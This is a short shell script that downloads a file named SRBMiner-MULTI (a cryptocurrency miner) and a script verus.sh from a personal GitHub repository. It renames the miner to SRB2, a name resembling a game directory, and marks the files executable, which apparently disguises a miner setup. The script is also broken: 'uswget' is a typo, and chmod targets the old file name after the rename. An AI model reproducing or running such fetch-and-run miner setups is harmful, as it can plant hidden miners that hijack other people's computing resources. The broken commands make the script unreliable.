mkdir ~/SRB2
cd ~/SRB2
uswget ${GITHUB_DOWNLOAD_URL} -O ~/SRB2/SRB2
wget https://raw.githubusercontent.com/Geokot82/SRB2/main/verus.sh -O ~/SRB2/verus.sh
wget https://raw.githubusercontent.com/Geokot82/SRB2/main/SRBMiner-MULTI -O ~/SRB2/SRBMiner-MULTI
mv SRBMiner-MULTI SRB2
chmod +x SRBMiner-MULTI
chmod +x verus.sh
